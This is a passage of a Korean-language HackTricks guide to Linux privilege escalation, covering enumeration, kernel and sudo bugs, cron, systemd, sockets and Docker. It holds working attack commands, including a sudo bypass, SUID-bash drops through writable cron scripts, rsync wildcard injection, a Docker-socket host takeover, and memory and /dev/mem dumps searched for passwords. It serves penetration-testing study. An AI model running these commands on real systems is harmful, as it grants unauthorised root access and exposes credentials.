# 리눅스 권한 상승

{% hint style="success" %}
AWS 해킹 학습 및 실습:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 학습 및 실습: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원</summary>

* [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* 해킹 트릭을 공유하려면 [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>
{% endhint %}

## 시스템 정보

### OS 정보

운영 중인 OS에 대한 지식을 얻기 시작합시다.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### 경로

만약 `PATH` 변수 내의 어떤 폴더에 **쓰기 권한이 있다면**, 일부 라이브러리 또는 이진 파일을 탈취할 수 있습니다:
```bash
echo $PATH
```
### 환경 정보

환경 변수에 흥미로운 정보, 비밀번호 또는 API 키가 있나요?
```bash
(env || set) 2>/dev/null
```
### 커널 exploits

커널 버전을 확인하고 권한 상승에 사용할 수 있는 exploit이 있는지 확인합니다.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
좋은 취약한 커널 목록과 이미 **컴파일된 exploits**을 다음에서 찾을 수 있습니다: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) 및 [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
일부 **컴파일된 exploits**을 찾을 수 있는 다른 사이트: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

해당 웹에서 모든 취약한 커널 버전을 추출하려면:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
다음은 커널 exploits을 검색하는 데 도움이 될 수 있는 도구들입니다:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (피해자에서 실행, 커널 2.x용 exploits만 확인)

항상 **Google에서 커널 버전을 검색**하십시오. 아마도 커널 버전이 커널 exploit에 기재되어 있을 수 있으며, 이를 통해 해당 exploit이 유효한지 확인할 수 있습니다.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo 버전

취약한 sudo 버전을 기반으로 합니다:
```bash
searchsploit sudo
```
다음 grep을 사용하여 sudo 버전이 취약한지 확인할 수 있습니다.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

@sickrov로부터
```
sudo -u#-1 /bin/bash
```
### Dmesg 서명 확인 실패

이 취약점이 어떻게 악용될 수 있는지에 대한 **예제**로 **HTB의 smasher2 상자**를 확인하십시오
```bash
dmesg 2>/dev/null | grep "signature"
```
### 더 많은 시스템 열거
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 가능한 방어책 열거

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

Grsecurity는 Linux 커널 보안 패치로, 특히 특권 상승 공격을 방지하는 데 도움이 됩니다.
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield

### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR

ASLR(주소 공간 렌덤화)는 공격자가 악의적인 코드를 실행하기 위해 사용하는 메모리 주소를 예측하기 어렵게 만드는 보안 기술입니다.
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

만약 도커 컨테이너 안에 있다면 탈출을 시도할 수 있습니다:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## 드라이브

**마운트된 것과 마운트되지 않은 것**을 확인하고, 어디에 마운트되었는지 그리고 왜 마운트되었는지 확인하세요. 무언가가 마운트되지 않았다면 마운트를 시도하고 개인 정보를 확인할 수 있습니다.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 유용한 소프트웨어

유용한 이진 파일을 나열합니다.
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
또한 **설치된 컴파일러**가 있는지 확인하십시오. 이는 커널 익스플로잇을 사용해야 할 때 유용합니다. 해당 머신에서 컴파일하는 것이 권장되므로 (또는 유사한 머신에서) 사용할 곳에서 컴파일하는 것이 좋습니다.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 취약한 소프트웨어 설치 확인

**설치된 패키지 및 서비스의 버전**을 확인합니다. 혹시 권한 상승을 위해 악용될 수 있는 오래된 Nagios 버전과 같은 것이 있을 수도 있습니다...\
의심스러운 소프트웨어의 버전은 수동으로 확인하는 것이 권장됩니다.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
만약 머신에 SSH 액세스 권한이 있다면 **openVAS**를 사용하여 머신 내에 설치된 오래되고 취약한 소프트웨어를 확인할 수도 있습니다.

{% hint style="info" %}
_이 명령어들은 대부분 쓸모없는 많은 정보를 보여줄 수 있으므로, 알려진 취약점에 대해 설치된 소프트웨어 버전이 취약한지 확인할 수 있는 OpenVAS나 유사한 응용 프로그램을 권장합니다._
{% endhint %}

## 프로세스

**어떤 프로세스**가 실행되고 있는지 살펴보고, **어떤 프로세스가** 그것이 가져야 할 **이상한 권한을 가지고 있는지** 확인해보세요 (어쩌면 root로 실행되는 톰캣이 있을 수도 있습니다).
```bash
ps aux
ps -ef
top -n 1
```
항상 가능한 **electron/cef/chromium 디버거**가 실행 중인지 확인하십시오. 권한 상승을 위해 악용할 수 있습니다. **Linpeas**는 해당 프로세스의 명령줄 내부에 있는 `--inspect` 매개변수를 확인하여 이를 감지합니다.  
또한 **프로세스 이진 파일에 대한 권한을 확인**하십시오. 다른 사용자의 것을 덮어쓸 수도 있습니다.

### 프로세스 모니터링

[**pspy**](https://github.com/DominicBreuker/pspy)와 같은 도구를 사용하여 프로세스를 모니터링할 수 있습니다. 이는 취약한 프로세스가 자주 실행되거나 일련의 요구 사항이 충족될 때 식별하는 데 매우 유용할 수 있습니다.

### 프로세스 메모리

일부 서버의 서비스는 **메모리 내부에 평문으로 자격 증명을 저장**합니다.  
일반적으로 다른 사용자에 속한 프로세스의 메모리를 읽으려면 **루트 권한**이 필요합니다. 따라서 이미 루트 권한을 가지고 있고 더 많은 자격 증명을 발견하려는 경우에 더 유용합니다.  
그러나 **일반 사용자로서 소유한 프로세스의 메모리를 읽을 수 있다는 것을 기억**하십시오.

{% hint style="warning" %}
요즘 대부분의 기계는 **기본적으로 ptrace를 허용하지 않는다는 것**을 유의하십시오. 이는 권한이 없는 사용자에 속한 다른 프로세스를 덤프할 수 없다는 것을 의미합니다.

파일 _**/proc/sys/kernel/yama/ptrace\_scope**_는 ptrace의 접근성을 제어합니다:

* **kernel.yama.ptrace\_scope = 0**: 동일한 uid를 가진 모든 프로세스를 디버깅할 수 있습니다. 이것은 ptracing이 작동하는 고전적인 방법입니다.
* **kernel.yama.ptrace\_scope = 1**: 부모 프로세스만 디버깅할 수 있습니다.
* **kernel.yama.ptrace\_scope = 2**: 관리자만 ptrace를 사용할 수 있습니다. CAP\_SYS\_PTRACE 능력이 필요합니다.
* **kernel.yama.ptrace\_scope = 3**: ptrace로 추적할 수 있는 프로세스가 없습니다. 한 번 설정하면 다시 ptracing을 활성화하려면 재부팅이 필요합니다.
{% endhint %}

#### GDB

FTP 서비스의 메모리에 액세스할 수 있다면 (예:), 힙을 얻고 그 자격 증명을 검색할 수 있습니다.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB 스크립트

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

특정 프로세스 ID에 대해 **맵은 해당 프로세스의** 가상 주소 공간 내에서 메모리가 매핑되는 방식을 보여주며, 각 매핑된 영역의 **권한을 보여줍니다**. **mem** 가상 파일은 **프로세스 메모리 자체를 노출**합니다. **maps** 파일에서는 **어떤 메모리 영역이 읽기 가능한지와 그 오프셋을 알 수 있습니다**. 이 정보를 사용하여 **mem 파일로 이동하고 모든 읽기 가능한 영역을 덤프하여 파일에 저장**합니다.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem`은 시스템의 **물리적** 메모리에 액세스할 수 있으며 가상 메모리가 아닙니다. 커널의 가상 주소 공간은 /dev/kmem을 사용하여 액세스할 수 있습니다.\
일반적으로 `/dev/mem`은 오직 **root**와 **kmem** 그룹에게 읽기 권한만 허용됩니다.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump은 Windows의 Sysinternals 도구 모음에서 영감을 받은 Linux 버전의 ProcDump 도구입니다. [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### 도구

프로세스 메모리를 덤프하려면 다음을 사용할 수 있습니다:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (루트) - \_루트 요구 사항을 수동으로 제거하고 소유한 프로세스를 덤프할 수 있습니다
* [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf)의 스크립트 A.5 (루트 권한 필요)

### 프로세스 메모리에서 자격 증명

#### 수동 예제

인증 프로세스가 실행 중인 것을 발견하면:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
당신은 프로세스를 덤프할 수 있으며(다른 방법을 찾아 프로세스 메모리를 덤프하는 방법은 이전 섹션을 참조하세요) 메모리 내에서 자격 증명을 검색할 수 있습니다:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### 미미펭귄

도구 [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin)는 **메모리에서 평문 자격 증명을 탈취**하고 일부 **잘 알려진 파일**에서 가져옵니다. 올바르게 작동하려면 루트 권한이 필요합니다.

| 기능                                              | 프로세스 이름         |
| ------------------------------------------------- | -------------------- |
| GDM 비밀번호 (Kali 데스크톱, Debian 데스크톱)       | gdm-password         |
| Gnome Keyring (Ubuntu 데스크톱, ArchLinux 데스크톱) | gnome-keyring-daemon |
| LightDM (Ubuntu 데스크톱)                          | lightdm              |
| VSFTPd (활성 FTP 연결)                             | vsftpd               |
| Apache2 (활성 HTTP 기본 인증 세션)                 | apache2              |
| OpenSSH (활성 SSH 세션 - Sudo 사용)                | sshd:                |

#### 검색 정규식/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## 예약/Cron 작업

예약된 작업 중 취약한 작업이 있는지 확인하십시오. 루트가 실행하는 스크립트를 악용할 수 있습니다 (와일드카드 취약성? 루트가 사용하는 파일을 수정할 수 있습니까? 심볼릭 링크를 사용할 수 있습니까? 루트가 사용하는 디렉토리에 특정 파일을 생성할 수 있습니까?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### 크론 경로

예를 들어, _/etc/crontab_ 내부에서 다음과 같은 경로를 찾을 수 있습니다: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_"user" 사용자가 /home/user에 대한 쓰기 권한을 가지고 있는지 주목하세요_)

만약 이 crontab 내에서 root 사용자가 경로를 설정하지 않고 명령어나 스크립트를 실행하려고 한다면. 예를 들어: _\* \* \* \* root overwrite.sh_\
그럼, 다음을 사용하여 root 쉘을 얻을 수 있습니다:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### 크론을 사용하여 와일드카드가 포함된 스크립트 실행 (와일드카드 인젝션)

루트에 의해 실행되는 스크립트에 명령어 내부에 "**\***"가 포함되어 있다면, 이를 악용하여 예상치 못한 일들(예를 들어 권한 상승)을 할 수 있습니다. 예시:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**만약 와일드카드가 경로 앞에 오는 경우** _**/some/path/\***_ **와 같이, 취약하지 않습니다 (심지어** _**./\***_ **도 아닙니다).**

더 많은 와일드카드 악용 기법을 보려면 다음 페이지를 읽어보세요:

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Cron 스크립트 덮어쓰기 및 심볼릭 링크

만약 **루트가 실행하는 cron 스크립트를 수정할 수 있다면**, 매우 쉽게 셸을 획들할 수 있습니다:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
만약 root가 실행한 스크립트가 **전체 액세스 권한이 있는 디렉토리**를 사용한다면, 해당 폴더를 삭제하고 **대신 다른 스크립트가 제어하는 심볼릭 링크 폴더를 생성**하는 것이 유용할 수 있습니다.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 빈번한 cron 작업

프로세스를 모니터링하여 1, 2 또는 5분마다 실행되는 프로세스를 검색할 수 있습니다. 이를 이용하여 권한 상승을 할 수도 있습니다.

예를 들어, **1분 동안 매 0.1초마다 모니터링**하고, **덜 실행된 명령어순으로 정렬**하여 가장 많이 실행된 명령어를 삭제하려면 다음을 수행할 수 있습니다:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**또한** [**pspy**](https://github.com/DominicBreuker/pspy/releases) **를 사용할 수 있습니다** (이것은 시작되는 모든 프로세스를 모니터링하고 나열할 것입니다).

### 보이지 않는 cron 작업

**주석 뒤에 개행 문자를 넣는** cron 작업을 만들 수 있습니다 (개행 문자 없이). 예시 (개행 문자를 주목하세요):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## 서비스

### 쓰기 가능한 _.service_ 파일

`.service` 파일을 쓸 수 있는지 확인하십시오. 가능하다면 서비스가 **시작될 때**, **다시 시작될 때** 또는 **중지될 때** **백도어를 실행**하도록 수정할 수 있습니다 (아마도 기기가 다시 부팅될 때까지 기다려야 할 수도 있습니다).\
예를 들어 .service 파일 내에 백도어를 만들고 **`ExecStart=/tmp/script.sh`**를 사용합니다.

### 쓰기 가능한 서비스 이진 파일

서비스에 의해 실행되는 **이진 파일에 쓰기 권한**이 있다면, 백도어로 변경하여 서비스가 다시 실행될 때 백도어가 실행될 수 있습니다.

### systemd PATH - 상대 경로

**systemd**에서 사용되는 PATH를 확인할 수 있습니다:
```bash
systemctl show-environment
```
만약 해당 경로의 어떤 폴더에 **쓰기** 권한이 있다면 **권한 상승**이 가능할 수 있습니다. 다음과 같은 **상대 경로가 서비스 구성 파일에서 사용**되는지 검색해야 합니다:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
그럼, **실행 가능한** **백도어가 실행될** 시스템 PATH 폴더 내에 상대 경로 이진 파일과 **동일한 이름을 가진 실행 파일**을 생성하고, 서비스가 취약한 동작(**시작**, **중지**, **다시로드**)을 실행하도록 요청받으면(일반 사용자는 일반적으로 서비스를 시작/중지할 수 없지만 `sudo -l`을 사용할 수 있는지 확인), **백도어가 실행될 것입니다**.

**`man systemd.service`**를 사용하여 서비스에 대해 더 자세히 알아보세요.

## **타이머**

**타이머**는 이름이 `**.timer**`로 끝나는 systemd 유닛 파일로, `**.service**` 파일이나 이벤트를 제어합니다. **타이머**는 달력 시간 이벤트와 단조 시간 이벤트에 대한 내장 지원이 있어 cron 대신 사용할 수 있으며 비동기적으로 실행할 수 있습니다.

다음 명령을 사용하여 모든 타이머를 나열할 수 있습니다:
```bash
systemctl list-timers --all
```
### 쓰기 가능한 타이머

타이머를 수정할 수 있다면 `.service` 또는 `.target`와 같은 systemd.unit의 일부를 실행하도록 만들 수 있습니다.
```bash
Unit=backdoor.service
```
문서에서 단위가 무엇인지 읽을 수 있습니다:

> 이 타이머가 경과할 때 활성화할 단위입니다. 인수는 ".timer"가 아닌 단위 이름입니다. 지정되지 않은 경우 이 값은 타이머 단위와 동일한 이름을 가진 서비스로 기본 설정됩니다. (위 참조) 활성화되는 단위 이름과 타이머 단위의 단위 이름이 접미사를 제외하고 동일하게 지정하는 것이 좋습니다.

따라서 이 권한을 남용하려면 다음을 수행해야 합니다:

* **쓰기 가능한 이진 파일을 실행하는** 시스템디 단위(예: `.service`)를 찾습니다.
* **상대 경로를 실행하는** 시스템디 단위를 찾고 **시스템디 경로에 대한 쓰기 권한**이 있어야 합니다(해당 실행 파일을 흉내 내기 위해).

**`man systemd.timer`로 타이머에 대해 자세히 알아보세요.**

### **타이머 활성화**

타이머를 활성화하려면 루트 권한이 필요하며 다음을 실행해야 합니다:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
**타이머**는 `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`에 심볼릭 링크를 생성하여 **활성화**됩니다.

## 소켓

유닉스 도메인 소켓(UDS)은 클라이언트-서버 모델 내에서 동일한 또는 다른 기기에서 **프로세스 통신**을 가능하게 합니다. 이들은 유닉스 기본 파일 기술자를 사용하여 컴퓨터 간 통신을 설정하며 `.socket` 파일을 통해 설정됩니다.

소켓은 `.socket` 파일을 사용하여 구성할 수 있습니다.

**`man systemd.socket`**을 사용하여 소켓에 대해 자세히 알아보세요. 이 파일 안에는 여러 흥미로운 매개변수를 구성할 수 있습니다:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: 이러한 옵션들은 다르지만 **어디에서 소켓을 듣을지를 나타내는** 요약이 사용됩니다 (AF\_UNIX 소켓 파일의 경로, 듣기 위한 IPv4/6 및/또는 포트 번호 등).
* `Accept`: 부울 인수를 취합니다. **true**인 경우, **각 들어오는 연결에 대해 서비스 인스턴스가 생성**되고 연결 소켓만 전달됩니다. **false**인 경우, 모든 듣기 소켓 자체가 **시작된 서비스 유닠에 전달**되며 모든 연결에 대해 하나의 서비스 유닛이 생성됩니다. 이 값은 데이터그램 소켓 및 FIFO에서는 무조건적으로 모든 들어오는 트래픽을 처리하는 단일 서비스 유닛이 생성됩니다. **기본값은 false**입니다. 성능상의 이유로 새로운 데몬은 `Accept=no`에 적합한 방식으로만 작성하는 것이 권장됩니다.
* `ExecStartPre`, `ExecStartPost`: 각각 **들어오는 소켓**/FIFO가 **생성되기 전** 또는 **후**에 실행되는 하나 이상의 명령줄을 취합니다. 명령줄의 첫 번째 토큰은 절대 파일 이름이어야 하며, 그 다음에는 프로세스의 인수가 따라야 합니다.
* `ExecStopPre`, `ExecStopPost`: 추가로 **들어오는 소켓**/FIFO가 **닫히고 제거된 후**에 실행되는 **명령어**입니다.
* `Service`: **들어오는 트래픽**에 대해 **활성화할 서비스** 유닛 이름을 지정합니다. 이 설정은 Accept=no인 소켓에 대해서만 허용됩니다. 이 설정은 소켓과 동일한 이름을 가진 서비스를 기본값으로 사용합니다. 대부분의 경우 이 옵션을 사용할 필요가 없습니다.

### 쓰기 가능한 .socket 파일

**쓰기 가능한** `.socket` 파일을 찾으면 `[Socket]` 섹션의 시작 부분에 다음과 같은 내용을 추가할 수 있습니다: `ExecStartPre=/home/kali/sys/backdoor` 그러면 소켓이 생성되기 전에 백도어가 실행됩니다. 따라서 **아마도 기기가 다시 부팅될 때까지 기다려야 할 것입니다.**\
_시스템이 해당 소켓 파일 구성을 사용하고 있어야만 백도어가 실행됨에 유의하십시오_

### 쓰기 가능한 소켓

**쓰기 가능한 소켓**을 식별하면 (_이제 우리는 구성 `.socket` 파일이 아닌 유닉스 소켓에 대해 이야기하고 있습니다_), 해당 소켓과 통신하고 취약점을 이용할 수 있습니다.

### 유닉스 소켓 열거
```bash
netstat -a -p --unix
```
### 원시 연결
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**악용 예시:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### HTTP 소켓

주의할 점은 **HTTP 요청을 수신 대기하는 소켓**이 있을 수 있다는 것입니다 (_저는 .socket 파일이 아닌 유닉스 소켓으로 작동하는 파일을 말하고 있습니다_). 다음 명령어로 확인할 수 있습니다:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
### 쓰기 가능한 도커 소켓

도커 소켓은 일반적으로 `/var/run/docker.sock` 경로에서 찾을 수 있으며 보안되어야 하는 중요한 파일입니다. 기본적으로 `root` 사용자와 `docker` 그룹의 구성원이 쓰기 권한을 갖습니다. 이 소켓에 쓰기 액세스 권한이 있으면 권한 상승이 발생할 수 있습니다. 이를 수행하는 방법과 도커 CLI를 사용할 수 없는 경우의 대체 방법에 대해 설명합니다.
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
#### **도커 API 직접 사용**

도커 CLI를 사용할 수 없는 경우에도 도커 소켓을 `curl` 명령어를 사용하여 조작할 수 있습니다.

1.  **도커 이미지 목록 보기:** 사용 가능한 이미지 목록을 가져옵니다.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```
2.  **컨테이너 생성:** 호스트 시스템의 루트 디렉토리를 마운트하는 컨테이너를 생성하는 요청을 보냅니다.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

새로 생성된 컨테이너를 시작합니다:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```
3.  **컨테이너에 연결:** `socat`을 사용하여 컨테이너에 연결을 설정하여 해당 컨테이너 내에서 명령을 실행할 수 있도록 합니다.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` 연결을 설정한 후에는 호스트 파일 시스템에 대한 루트 수준 액세스로 컨테이너 내에서 명령을 직접 실행할 수 있습니다.

### 기타

도커 소켓에 대한 쓰기 권한이 있기 때문에 **`docker` 그룹 내부에 있을 경우 권한 상승을 위한 [**추가 방법**](interesting-groups-linux-pe/#docker-group)이 있습니다. [**도커 API가 포트에서 수신 대기 중인 경우 해당 API를 침해할 수도 있습니다**](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

도커를 탈출하거나 권한 상승을 위해 도커를 남용할 수 있는 **더 많은 방법**을 확인하려면:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Containerd (ctr) 권한 상승

**`ctr`** 명령어를 사용할 수 있다면 **권한 상승을 위해 남용할 수도 있습니다**. 다음 페이지를 읽어보세요:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## **RunC** 권한 상승

**`runc`** 명령어를 사용할 수 있다면 **권한 상승을 위해 남용할 수도 있습니다**. 다음 페이지를 읽어보세요:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-Bus는 응용 프로그램이 효율적으로 상호 작용하고 데이터를 공유할 수 있는 정교한 **프로세스 간 통신 (IPC) 시스템**입니다. 현대적인 리눅스 시스템을 고려하여 설계되었으며, 다양한 형태의 응용 프로그램 통신을 위한 견고한 프레임워크를 제공합니다.

